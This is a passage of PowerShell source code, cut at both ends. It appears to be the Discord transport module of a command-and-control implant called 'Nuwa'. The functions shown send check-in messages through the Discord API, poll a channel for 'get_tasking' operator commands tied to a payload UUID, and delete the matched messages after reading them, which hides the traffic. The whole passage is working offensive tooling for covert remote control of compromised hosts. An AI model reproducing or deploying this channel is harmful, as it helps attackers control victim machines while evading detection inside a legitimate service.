            $pendingTaskingMinimumTimestamp = $previousRequestStartedAt
        }
        $script:NuwaDiscordLastTaskingRequestStartedAt = $requestStartedAt
    }
    $requestMessage = if ($wrapper.Length -gt 1900) {
        Send-NuwaDiscordApiAttachment -Content $wrapper
    } else {
        Send-NuwaDiscordApiJson -Content $wrapper
    }
    $afterMessageId = [string](Get-NuwaDiscordObjectProperty -Object $requestMessage -Name 'id')
    Write-NuwaDebug ("Discord request action {0} after_message_id={1}" -f $ExpectedAction, $afterMessageId)
    $emptyTaskingMatch = $null

    for ($attempt = 0; $attempt -lt [int]$script:NuwaConfig.MessageChecks; $attempt += 1) {
        $messages = @(Get-NuwaDiscordMessages -AfterMessageId $afterMessageId)
        Write-NuwaDebug (
            "Discord poll action={0} attempt={1}/{2} after_message_id={3} message_count={4}" -f
            $ExpectedAction,
            ($attempt + 1),
            [int]$script:NuwaConfig.MessageChecks,
            $afterMessageId,
            $messages.Count
        )
        $alternateClientIds = @()
        if (
            -not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.PayloadUUID) -and
            [string]$script:NuwaConfig.PayloadUUID -ne $Uuid
        ) {
            $alternateClientIds += [string]$script:NuwaConfig.PayloadUUID
        }
        $minimumTimestamp = if ([string]::IsNullOrWhiteSpace($afterMessageId)) {
            $requestStartedAt
        } else { [DateTimeOffset]::MinValue }
        $matched = Find-NuwaDiscordInboundMessage -Messages $messages `
            -ExpectedClientId $Uuid -AlternateClientIds $alternateClientIds `
            -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid `
            -ExpectedRequest $expectedRequest -MinimumTimestamp $minimumTimestamp
        if (
            -not [string]::IsNullOrWhiteSpace($afterMessageId) -and
            (
                $null -eq $matched -or
                (
                    $ExpectedAction -eq $script:NuwaA_get_tasking -and
                    -not (Test-NuwaDiscordMessageHasTasks -Message $matched -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid)
                )
            )
        ) {
            $pendingMinimumTimestamp = $requestStartedAt
            if ($ExpectedAction -eq $script:NuwaA_get_tasking) {
                # Tasking can arrive between polling cycles, so the fallback must
                # scan back to the previous poll boundary without replaying older
                # leftover tasking from the channel history.
                $pendingMinimumTimestamp = $pendingTaskingMinimumTimestamp
            }
            $pendingMessages = @(Get-NuwaDiscordMessages)
            Write-NuwaDebug (
                "Discord fallback action={0} attempt={1}/{2} minimum_timestamp={3:o} message_count={4}" -f
                $ExpectedAction,
                ($attempt + 1),
                [int]$script:NuwaConfig.MessageChecks,
                $pendingMinimumTimestamp,
                $pendingMessages.Count
            )
            $pendingMatch = Find-NuwaDiscordInboundMessage -Messages $pendingMessages `
                -ExpectedClientId $Uuid -AlternateClientIds @() `
                -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid `
                -MinimumTimestamp $pendingMinimumTimestamp `
                -ExpectedRequest $expectedRequest -RequireExpectedClientId
            if (
                $ExpectedAction -eq $script:NuwaA_get_tasking -and
                $null -ne $payloadTaskingHandoffMinimumTimestamp -and
                (
                    $null -eq $pendingMatch -or
                    -not (Test-NuwaDiscordMessageHasTasks -Message $pendingMatch -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid)
                )
            ) {
                $payloadPendingMatch = Find-NuwaDiscordInboundMessage -Messages $pendingMessages `
                    -ExpectedClientId ([string]$script:NuwaConfig.PayloadUUID) `
                    -AlternateClientIds @() -ExpectedAction $ExpectedAction `
                    -ExpectedUuid $Uuid -MinimumTimestamp $payloadTaskingHandoffMinimumTimestamp `
                    -ExpectedRequest $expectedRequest -RequireExpectedClientId
                if (
                    $null -ne $payloadPendingMatch -and
                    (Test-NuwaDiscordMessageHasTasks -Message $payloadPendingMatch -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid)
                ) {
                    $pendingMatch = $payloadPendingMatch
                }
            }
            if (
                $null -ne $pendingMatch -and
                (
                    $ExpectedAction -ne $script:NuwaA_get_tasking -or
                    (Test-NuwaDiscordMessageHasTasks -Message $pendingMatch -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid)
                )
            ) {
                $messages = $pendingMessages
                $matched = $pendingMatch
            }
        }
        if ($null -ne $matched) {
            $matchedHasTasks = $true
            if ($ExpectedAction -eq $script:NuwaA_get_tasking) {
                $matchedHasTasks = Test-NuwaDiscordMessageHasTasks -Message $matched -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid
            }
            $matchedClientId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'client_id')
            if ([string]::IsNullOrWhiteSpace($matchedClientId)) {
                $matchedClientId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'sender_id')
            }
            $matchedMessageId = [string](Get-NuwaDiscordCandidateSlot -Candidate $matched -Slot 3)
            Write-NuwaDebug (
                "Discord matched action={0} attempt={1}/{2} message_id={3} target_client_id={4} has_tasks={5}" -f
                $ExpectedAction,
                ($attempt + 1),
                [int]$script:NuwaConfig.MessageChecks,
                $matchedMessageId,
                $matchedClientId,
                $matchedHasTasks
            )
            if (-not $script:NuwaDiscordProcessedMessageIds) {
                $script:NuwaDiscordProcessedMessageIds = @()
            }
            if (
                -not [string]::IsNullOrWhiteSpace([string](Get-NuwaDiscordCandidateSlot -Candidate $matched -Slot 3))
            ) {
                $script:NuwaDiscordProcessedMessageIds += [string](Get-NuwaDiscordCandidateSlot -Candidate $matched -Slot 3)
                if ($script:NuwaDiscordProcessedMessageIds.Count -gt 2048) {
                    $script:NuwaDiscordProcessedMessageIds = @(
                        $script:NuwaDiscordProcessedMessageIds |
                            Select-Object -Last 2048
                    )
                }
            }
            foreach ($message in $messages) {
                $candidate = ConvertFrom-NuwaDiscordMessage -Message $message
                if (
                    [string]$message.id -and
                    $null -ne $candidate -and
                    [string](Get-NuwaDiscordObjectProperty -Object $candidate -Name 'message') -eq [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'message') -and
                    [string](Get-NuwaDiscordObjectProperty -Object $candidate -Name 'sender_id') -eq [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'sender_id')
                ) {
                    try {
                        Write-NuwaDebug ("Discord deleting matched message_id={0}" -f ([string]$message.id))
                        Remove-NuwaDiscordMessage -MessageId ([string]$message.id)
                    } catch {
                        Write-NuwaDebug ("Discord delete failed for message_id={0}: {1}" -f ([string]$message.id), $_.Exception.Message)
                    }
                    break
                }
            }
            if ($ExpectedAction -eq $script:NuwaA_get_tasking -and -not $matchedHasTasks) {
                $emptyTaskingMatch = $matched
                Write-NuwaDebug (
                    "Discord matched empty get_tasking action on attempt={0}/{1}" -f
                    ($attempt + 1),
                    [int]$script:NuwaConfig.MessageChecks
                )
                if ($attempt + 1 -lt [int]$script:NuwaConfig.MessageChecks) {
                    Start-Sleep -Seconds ([int]$script:NuwaConfig.TimeBetweenChecks)
                    continue
                }
            }
            # The response reader validates and strips the UUID frame. Return the
            # decoded carrier body here; slot 2 contains only the inner wire bytes.
            return ,([byte[]](Get-NuwaDiscordObjectProperty -Object $matched -Name 'message'))
        }
        if ($attempt + 1 -lt [int]$script:NuwaConfig.MessageChecks) {
            Start-Sleep -Seconds ([int]$script:NuwaConfig.TimeBetweenChecks)
        }
    }

    if ($null -ne $emptyTaskingMatch) {
        # The caller removes the UUID route from the carrier response. Slot 2
        # contains only the inner wire bytes and cannot be returned here.
        return ,([byte[]](Get-NuwaDiscordObjectProperty -Object $emptyTaskingMatch -Name 'message'))
    }

    return $null
}

function Invoke-NuwaTransport {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [int]$Action,

        [Parameter(Mandatory = $true)]
        [byte[]]$WireBody
    )

    Write-NuwaDebug ("Discord transport action {0} for {1}" -f $Action, $Uuid)
    $body = New-NuwaTransportRequestBody -Uuid $Uuid -WireBody $WireBody
    return Invoke-NuwaDiscordRequest `
        -TransportBody $body `
        -WireBody $WireBody `
        -Uuid $Uuid `
        -ExpectedAction $Action
}
